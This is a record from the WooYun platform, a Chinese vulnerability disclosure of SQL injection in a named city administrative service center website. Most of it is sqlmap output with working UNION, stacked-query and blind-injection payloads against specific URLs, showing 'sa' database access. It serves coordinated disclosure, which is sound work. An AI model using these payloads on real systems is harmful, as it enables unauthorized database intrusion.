{"id": 50547, "wybug_id": "wooyun-2014-077529", "wybug_title": "某市行政服务中心sql注入漏洞（sa权限）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2014-09-28 13:50", "wybug_open_date": "2014-11-12 13:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向公众公开  简要描述： 多个参数都有注入危险 详细说明：  起因：\nhttp://wooyun.org/bugs/wooyun-2014-070878\n看到这里测试了下，就去另外参数处测试了下，，发现问题还是挺多的测试地址1：\nhttp://www.ssbz.gov.cn/web/web_info_list.jsp?type=13&catalog=2\n此处type和catalag参数均存在注入危险\n---Place: GETParameter: type    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: type=-6262' UNION ALL SELECT NULL,CHAR(113)+CHAR(103)+CHAR(114)+CHAR(122)+CHAR(113)+CHAR(90)+CHAR(122)+CHAR(85)+CHAR(114)+CHAR(106)+CHAR(109)+CHAR(77)+CHAR(86)+CHAR(90)+CHAR(105)+CHAR(113)+CHAR(101)+CHAR(111)+CHAR(121)+CHAR(113),NULL,NULL-- &catalog=2    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=13'; WAITFOR DELAY '0:0:5'--&catalog=2    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=13' WAITFOR DELAY '0:0:5'--&catalog=2---[14:02:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000[14:02:16] [INFO] fetching current user[14:02:16] [WARNING] reflective value(s) found and filtering outcurrent user:    'sa'[14:02:16] [INFO] fetching current databasecurrent database:    'appo_ss'---Place: GETParameter: catalog    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=13&catalog=2' AND 5341=5341 AND 'WDMH'='WDMH    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: type=13&catalog=2' UNION ALL SELECT NULL,CHAR(113)+CHAR(103)+CHAR(114)+CHAR(122)+CHAR(113)+CHAR(67)+CHAR(121)+CHAR(97)+CHAR(85)+CHAR(103)+CHAR(88)+CHAR(109)+CHAR(100)+CHAR(117)+CHAR(87)+CHAR(113)+CHAR(101)+CHAR(111)+CHAR(121)+CHAR(113),NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=13&catalog=2'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=13&catalog=2' WAITFOR DELAY '0:0:5'-----\n测试地址2：\nhttp://www.ssbz.gov.cn/web/web_info.jsp?id=484\n\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 56 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=484' AND 3470=3470 AND 'vzOi'='vzOi    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=484'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=484' WAITFOR DELAY '0:0:5'-----\n测试地址3：\nhttp://www.ssbz.gov.cn/web/about_us.jsp?type=16\n\nGET parameter 'type' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 43 HTTP(s) requests:---Place: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=16' AND 8161=8161 AND 'ztMN'='ztMN    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: type=16' UNION ALL SELECT NULL,CHAR(113)+CHAR(108)+CHAR(102)+CHAR(118)+CHAR(113)+CHAR(117)+CHAR(102)+CHAR(101)+CHAR(90)+CHAR(119)+CHAR(113)+CHAR(111)+CHAR(65)+CHAR(108)+CHAR(75)+CHAR(113)+CHAR(110)+CHAR(114)+CHAR(114)+CHAR(113),NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=16'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=16' WAITFOR DELAY '0:0:5'-----[14:23:42] [INFO] testing Microsoft SQL Server[14:23:42] [INFO] confirming Microsoft SQL Server[14:23:44] [INFO] the back-end DBMS is Microsoft SQL Server[14:23:44] [INFO] fetching bannerweb application technology: JSPback-end DBMS operating system: Windows 2003 Service Pack 2back-end DBMS: Microsoft SQL Server 2000banner:---Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)        May  3 2005 23:18:38        Copyright (c) 1988-2003 Microsoft Corporation        Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)---\n   漏洞证明：  \n\n   修复方案：  对整站所有参数都过滤一下：）   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-09-29 16:37 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}